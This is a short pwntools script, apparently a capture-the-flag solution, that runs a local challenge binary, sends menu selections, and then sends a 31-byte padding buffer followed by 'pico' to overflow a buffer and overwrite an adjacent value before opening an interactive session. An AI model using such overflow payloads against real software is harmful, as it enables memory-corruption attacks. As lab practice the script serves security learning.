from pwn import *

r = process('./chall')

payload = b'a' * 31
payload += b'pico'

r.sendline(b'5')
r.sendline(b'2')
r.sendline(b'1')
r.sendline(payload)

r.interactive()
